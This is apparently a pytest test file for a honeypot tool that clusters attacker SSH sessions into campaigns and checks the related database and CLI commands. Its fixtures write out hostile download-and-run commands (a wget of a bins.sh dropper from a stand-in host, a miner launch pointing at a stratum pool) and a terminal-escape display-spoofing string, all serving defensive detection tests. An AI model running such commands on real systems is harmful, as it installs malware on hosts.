"""Campaign grouping: what links sessions, what must not, and that results are stable."""

import logging
import random
from datetime import UTC, datetime, timedelta

import pytest

from surya_kundal import campaigns as camp
from surya_kundal.cli import main
from surya_kundal.database.engine import create_db_engine, init_db, make_session_factory
from surya_kundal.database.models import (
    Campaign,
    CampaignEvidence,
    CampaignSession,
    Command,
    Download,
    HoneypotSession,
    Login,
    TechniqueMatch,
    TunnelRequest,
    Upload,
)

T0 = datetime(2026, 10, 1, 12, 0, tzinfo=UTC)
SHA_X = "a" * 64
SHA_Y = "b" * 64
SCRIPT = [
    "cd /tmp",
    "wget http://203.0.113.9/bins.sh",
    "chmod +x bins.sh",
    "sh bins.sh",
]


def facts(sid, n=0, **kwargs):
    return camp.SessionFacts(
        id=sid,
        ip=kwargs.pop("ip", f"198.51.100.{n % 250 + 1}"),
        start=T0 + timedelta(hours=n),
        **kwargs,
    )


def groups(sessions):
    return sorted(sorted(c.session_ids) for c in camp.cluster(sessions))


# --- normalising commands --------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "shape"),
    [
        ("wget http://1.2.3.4/x.sh", "wget <url>"),
        ("WGET  HTTP://evil.example/Bins.SH", "wget <url>"),
        ("ping 8.8.8.8 -c 4", "ping <ip> -c <n>"),
        ("echo deadbeefcafebabe1234", "echo <hex>"),
        ("echo aB3dE5gH7jK9mN", "echo <rand>"),
        ("  cd   /tmp  ", "cd /tmp"),
        ("sleep 30", "sleep <n>"),
    ],
)
def test_normalise_command(raw, shape):
    assert camp.normalise_command(raw) == shape


def test_a_long_word_is_not_mistaken_for_random_text():
    assert (
        camp.normalise_command("cat /etc/ssh/sshd_configuration")
        == "cat /etc/ssh/sshd_configuration"
    )


# --- what links sessions ---------------------------------------------------------------


def test_one_shared_payload_links_sessions_from_different_addresses():
    result = groups([facts("a", 0, files={SHA_X}), facts("b", 1, files={SHA_X}), facts("c", 2)])
    assert result == [["a", "b"]]


def test_the_empty_file_links_nothing():
    assert (
        groups([facts("a", 0, files={camp.EMPTY_SHA256}), facts("b", 1, files={camp.EMPTY_SHA256})])
        == []
    )


def test_the_same_url_links_even_when_the_query_string_differs():
    a = facts("a", 0, urls={"http://evil.example/bot.sh?id=111"})
    b = facts("b", 1, urls={"http://EVIL.example/bot.sh?id=222#x"})
    assert groups([a, b]) == [["a", "b"]]


def test_different_urls_on_one_host_need_help_to_link():
    a = facts("a", 0, urls={"http://evil.example/one.sh"})
    b = facts("b", 1, urls={"http://evil.example/two.sh"})
    assert groups([a, b]) == []  # the host alone is worth 3, not 5
    a.hassh = b.hassh = "h" * 32
    assert groups([a, b]) == [["a", "b"]]  # host (3) + client fingerprint (2)


def test_the_same_script_aimed_at_different_targets_is_one_campaign():
    a = facts("a", 0, commands=SCRIPT)
    b = facts("b", 1, commands=[c.replace("203.0.113.9", "192.0.2.77") for c in SCRIPT])
    assert groups([a, b]) == [["a", "b"]]


def test_a_different_script_does_not_link():
    other = ["cat /proc/cpuinfo", "free -m", "crontab -l", "ls -la /root"]
    assert groups([facts("a", 0, commands=SCRIPT), facts("b", 1, commands=other)]) == []


def test_exit_and_logout_do_not_count_as_a_script():
    a = facts("a", 0, commands=["uname -a", "exit"])
    b = facts("b", 1, commands=["uname -a", "exit"])
    assert groups([a, b]) == []


def test_two_short_recon_commands_do_not_link():
    assert (
        groups(
            [
                facts("a", 0, commands=["uname -a", "whoami"]),
                facts("b", 1, commands=["uname -a", "whoami"]),
            ]
        )
        == []
    )


def test_one_very_long_command_links_on_its_own():
    long = "cd /tmp && wget -q http://x.example/a -O a && chmod 777 a && ./a --daemon --pool stratum+tcp://x.example"
    assert groups([facts("a", 0, commands=[long]), facts("b", 1, commands=[long])]) == [["a", "b"]]


def test_a_shared_ssh_client_alone_never_links():
    a, b = (
        facts("a", 0, hassh="h" * 32, client="SSH-2.0-Go"),
        facts("b", 1, hassh="h" * 32, client="SSH-2.0-Go"),
    )
    assert groups([a, b]) == []


def test_client_fingerprint_plus_two_rare_passwords_link():
    creds = [("root", "Zx9!kQ"), ("admin", "r4Nd0m#1")]
    a = facts("a", 0, hassh="h" * 32, credentials=list(creds))
    b = facts("b", 1, hassh="h" * 32, credentials=list(creds))
    assert groups([a, b]) == [["a", "b"]]
    one = facts("c", 2, hassh="h" * 32, credentials=creds[:1])
    two = facts("d", 3, hassh="h" * 32, credentials=creds[:1])
    assert groups([one, two]) == []  # fingerprint (2) + one password (1.5) is not enough


def test_a_password_list_tried_in_the_same_order_is_a_signature():
    attempts = [("root", f"pw{n}") for n in range(10)]
    a = facts("a", 0, credentials=attempts, hassh="h" * 32)
    b = facts("b", 1, credentials=list(attempts), hassh="h" * 32)
    result = camp.cluster([a, b])
    assert [sorted(c.session_ids) for c in result] == [["a", "b"]]
    assert "credlist" in {e.kind for e in result[0].evidence}


def test_the_same_passwords_in_a_different_order_have_a_different_signature():
    forward = [("root", f"pw{n}") for n in range(10)]
    a = camp.features_of(facts("a", 0, credentials=forward))
    b = camp.features_of(facts("b", 1, credentials=forward[::-1]))
    assert {k for k in a if k.startswith("credlist")} != {k for k in b if k.startswith("credlist")}


def test_a_tunnel_destination_plus_client_version_link():
    a = facts("a", 0, tunnels={"9.9.9.9:25"}, client="SSH-2.0-libssh")
    b = facts("b", 1, tunnels={"9.9.9.9:25"}, client="SSH-2.0-libssh")
    assert groups([a, b]) == [["a", "b"]]


def test_links_chain_into_one_campaign():
    a = facts("a", 0, files={SHA_X})
    b = facts("b", 1, files={SHA_X, SHA_Y})
    c = facts("c", 2, files={SHA_Y})
    d = facts("d", 3, files={"c" * 64})
    assert groups([a, b, c, d]) == [["a", "b", "c"]]


def test_a_weak_feature_shared_by_a_crowd_is_ignored():
    def crowd(size):
        return [
            facts(f"s{n:02}", n, hassh="h" * 32, commands=["cat /proc/cpuinfo | grep name | wc -l"])
            for n in range(size)
        ]

    assert groups(crowd(camp.MAX_WEAK_GROUP + 5)) == []  # a popular tool, not one operation
    assert len(groups(crowd(10))) == 1  # the same evidence from a few sessions is an operation


def test_a_strong_feature_is_never_ignored_however_many_sessions_share_it():
    crowd = [facts(f"s{n:03}", n, files={SHA_X}) for n in range(300)]
    assert [len(g) for g in groups(crowd)] == [300]


# --- results are stable ------------------------------------------------------------------


def test_input_order_does_not_change_the_result():
    sessions = [
        facts("a", 0, files={SHA_X}),
        facts("b", 1, files={SHA_X}),
        facts("c", 2, commands=SCRIPT),
        facts("d", 3, commands=SCRIPT),
        facts("e", 4),
    ]
    expected = camp.cluster(sessions)
    for seed in range(5):
        shuffled = sessions[:]
        random.Random(seed).shuffle(shuffled)  # noqa: S311  (test shuffling, not security)
        assert camp.cluster(shuffled) == expected


def test_campaign_id_comes_from_the_earliest_session_and_survives_growth():
    first = camp.cluster([facts("a", 0, files={SHA_X}), facts("b", 1, files={SHA_X})])[0]
    grown = camp.cluster(
        [facts("a", 0, files={SHA_X}), facts("b", 1, files={SHA_X}), facts("z", 9, files={SHA_X})]
    )[0]
    assert grown.id == first.id
    assert len(grown.session_ids) == 3 and grown.id.startswith("c")


def test_nothing_to_group_is_an_empty_list():
    assert camp.cluster([]) == []
    assert camp.cluster([facts("only", 0, files={SHA_X})]) == []


def test_evidence_says_why_sessions_were_grouped():
    result = camp.cluster(
        [facts("a", 0, files={SHA_X}, hassh="h" * 32), facts("b", 1, files={SHA_X}, hassh="h" * 32)]
    )[0]
    assert result.evidence[0] == camp.Evidence(kind="file", value=SHA_X, sessions=2)
    assert {e.kind for e in result.evidence} == {"file", "hassh"}


def test_evidence_leaves_out_a_popular_weak_feature():
    members = [facts(f"s{n:02}", n, files={SHA_X}, client="SSH-2.0-Common") for n in range(2)]
    crowd = [facts(f"x{n:02}", 10 + n, client="SSH-2.0-Common") for n in range(40)]
    result = next(c for c in camp.cluster(members + crowd) if "s00" in c.session_ids)
    assert {e.kind for e in result.evidence} == {"file"}


def test_pair_memory_guard_degrades_instead_of_failing(monkeypatch, caplog):
    monkeypatch.setattr(camp, "MAX_PAIRS", 5)
    sessions = [
        facts(f"s{n}", n, hassh="h" * 32, credentials=[("root", f"rare{k}") for k in range(4)])
        for n in range(10)
    ]
    with caplog.at_level(logging.WARNING):
        camp.cluster(sessions)
    assert "too many weak links" in caplog.text


# --- the database ------------------------------------------------------------------------


@pytest.fixture
def db_url(tmp_path):
    url = f"sqlite:///{tmp_path / 'camp.db'}"
    engine = create_db_engine(url)
    init_db(engine)
    engine.dispose()
    return url


@pytest.fixture
def db(db_url):
    engine = create_db_engine(db_url)
    with make_session_factory(engine)() as session:
        yield session


def add(db, sid, ip, hours, *, commands=(), files=(), url=None, uploads=(), tunnels=(), hassh=None):
    when = T0 + timedelta(hours=hours)
    db.add(
        HoneypotSession(
            id=sid, src_ip=ip, start_time=when, hassh=hassh, client_version="SSH-2.0-test"
        )
    )
    db.flush()
    db.add(Login(session_id=sid, username="root", password="toor", success=True, timestamp=when))
    for n, command in enumerate(commands):
        db.add(Command(session_id=sid, command=command, timestamp=when + timedelta(seconds=n)))
    for sha in files:
        db.add(Download(session_id=sid, url=url, sha256=sha, timestamp=when))
    for sha in uploads:
        db.add(Upload(session_id=sid, filename="f", sha256=sha, timestamp=when))
    for dst in tunnels:
        db.add(
            TunnelRequest(
                session_id=sid,
                dst_ip=dst,
                dst_port=25,
                orig_ip="1.1.1.1",
                orig_port=1,
                timestamp=when,
            )
        )
    db.commit()


@pytest.fixture
def seeded(db):
    add(
        db,
        "s1",
        "198.51.100.1",
        0,
        commands=SCRIPT,
        files=[SHA_X],
        url="http://203.0.113.9/bins.sh",
    )
    add(
        db,
        "s2",
        "198.51.100.2",
        5,
        commands=SCRIPT,
        files=[SHA_X],
        url="http://203.0.113.9/bins.sh",
    )
    add(db, "s3", "198.51.100.2", 9, commands=["ls"], uploads=[SHA_X])
    add(db, "s4", "198.51.100.3", 12, commands=["uname -a"])
    add(db, "t1", "198.51.100.4", 20, tunnels=["9.9.9.9"], hassh="f" * 32)
    add(db, "t2", "198.51.100.5", 21, tunnels=["9.9.9.9"], hassh="f" * 32)
    db.add(
        TechniqueMatch(
            session_id="s1",
            command_id=None,
            technique_id="T1105",
            tactics="c2",
            rule_id="r",
            confidence="high",
            evidence="e",
        )
    )
    db.commit()
    return db


def test_build_stores_campaigns_and_reports_coverage(seeded):
    result = camp.build_campaigns(seeded, now=T0)
    assert result == camp.BuildResult(campaigns=2, sessions=5, total=6)
    stored = {c.session_count: c for c in seeded.query(Campaign).all()}
    assert stored[3].ip_count == 2 and stored[3].first_seen == T0
    assert stored[2].ip_count == 2
    assert seeded.query(CampaignSession).count() == 5


def test_rebuild_is_repeatable_and_keeps_ids(seeded):
    camp.build_campaigns(seeded, now=T0)
    first = {c.id: c.session_count for c in seeded.query(Campaign).all()}
    camp.build_campaigns(seeded, now=T0 + timedelta(days=1))
    assert {c.id: c.session_count for c in seeded.query(Campaign).all()} == first
    assert seeded.query(CampaignSession).count() == 5


def test_rebuild_forgets_campaigns_whose_sessions_are_gone(seeded):
    camp.build_campaigns(seeded)
    for sid in ("t1", "t2"):
        seeded.delete(seeded.get(HoneypotSession, sid))
    seeded.commit()
    result = camp.build_campaigns(seeded)
    assert result.campaigns == 1
    assert seeded.query(Campaign).count() == 1
    assert seeded.query(CampaignEvidence).filter(CampaignEvidence.kind == "tunnel").count() == 0


def test_an_empty_database_builds_nothing(db):
    assert camp.build_campaigns(db) == camp.BuildResult(0, 0, 0)


def test_list_find_and_detail(seeded):
    camp.build_campaigns(seeded)
    rows = camp.list_campaigns(seeded)
    assert [r.sessions for r in rows] == [3, 2]
    assert rows[0].top_evidence is not None and rows[0].top_evidence.kind in (
        "file",
        "url",
        "cmdseq",
    )
    assert [r.sessions for r in camp.list_campaigns(seeded, min_ips=3)] == []
    assert len(camp.list_campaigns(seeded, limit=1)) == 1

    big = rows[0].id
    assert camp.find_campaign(seeded, big) == big
    assert camp.find_campaign(seeded, big[:4]) == big
    assert camp.find_campaign(seeded, "nope") is None

    detail = camp.campaign_detail(seeded, big)
    assert detail is not None
    assert detail.ips == [("198.51.100.2", 2, None), ("198.51.100.1", 1, None)]
    assert ("T1105", 1) in detail.techniques
    assert dict(detail.commands)["cd /tmp"] == 2
    assert [s[0] for s in detail.sessions] == ["s1", "s2", "s3"]
    assert camp.campaign_detail(seeded, "missing") is None


def test_an_ambiguous_prefix_is_refused(db):
    now = T0
    for cid in ("cabc111111", "cabc222222"):
        db.add(
            Campaign(
                id=cid, first_seen=now, last_seen=now, session_count=2, ip_count=1, built_at=now
            )
        )
    db.commit()
    with pytest.raises(ValueError, match="more than one"):
        camp.find_campaign(db, "cabc")
    assert camp.find_campaign(db, "cabc1") == "cabc111111"


# --- the command ---------------------------------------------------------------------------


@pytest.fixture
def cli_db(db_url):
    engine = create_db_engine(db_url)
    with make_session_factory(engine)() as db:
        add(
            db,
            "s1",
            "198.51.100.1",
            0,
            commands=SCRIPT,
            files=[SHA_X],
            url="http://203.0.113.9/b.sh",
        )
        add(
            db,
            "s2",
            "198.51.100.2",
            5,
            commands=SCRIPT,
            files=[SHA_X],
            url="http://203.0.113.9/b.sh",
        )
    engine.dispose()
    return db_url


def test_command_build_list_show(cli_db, capsys):
    assert main(["campaigns", "list", "--db", cli_db]) == 0
    assert "No campaigns yet" in capsys.readouterr().out

    assert main(["campaigns", "build", "--db", cli_db]) == 0
    assert "Built 1 campaign(s) covering 2 of 2 session(s)." in capsys.readouterr().out

    assert main(["campaigns", "list", "--db", cli_db]) == 0
    listing = capsys.readouterr().out
    assert "CAMPAIGN" in listing and "LINKED BY" in listing
    campaign_id = listing.splitlines()[1].split()[0]

    assert main(["campaigns", "show", campaign_id[:5], "--db", cli_db]) == 0
    shown = capsys.readouterr().out
    assert f"Campaign {campaign_id}: 2 sessions from 2 address(es)" in shown
    assert "Why these sessions are grouped" in shown and SHA_X in shown
    assert "198.51.100.1" in shown and "cd /tmp" in shown


def test_command_show_reports_unknown_and_ambiguous(cli_db, capsys):
    main(["campaigns", "build", "--db", cli_db])
    capsys.readouterr()
    assert main(["campaigns", "show", "zzz", "--db", cli_db]) == 2
    assert "no campaign" in capsys.readouterr().err


def test_command_does_not_create_a_missing_database(tmp_path, capsys):
    missing = tmp_path / "x.db"
    assert main(["campaigns", "list", "--db", f"sqlite:///{missing}"]) == 2
    assert "does not exist" in capsys.readouterr().err
    assert not missing.exists()


def test_command_shows_attacker_text_safely(db_url, capsys):
    engine = create_db_engine(db_url)
    with make_session_factory(engine)() as db:
        evil = [
            "echo \x1b[2J‮gpj.exe",
            "cd /tmp",
            "wget http://203.0.113.9/x",
            "sh x",
            "echo done now ok",
        ]
        add(db, "e1", "198.51.100.1", 0, commands=evil)
        add(db, "e2", "198.51.100.2", 1, commands=evil)
    engine.dispose()
    main(["campaigns", "build", "--db", db_url])
    capsys.readouterr()
    main(["campaigns", "list", "--db", db_url])
    campaign_id = capsys.readouterr().out.splitlines()[1].split()[0]
    main(["campaigns", "show", campaign_id, "--db", db_url])
    out = capsys.readouterr().out
    assert "\x1b" not in out and "‮" not in out and "\\x1b" in out
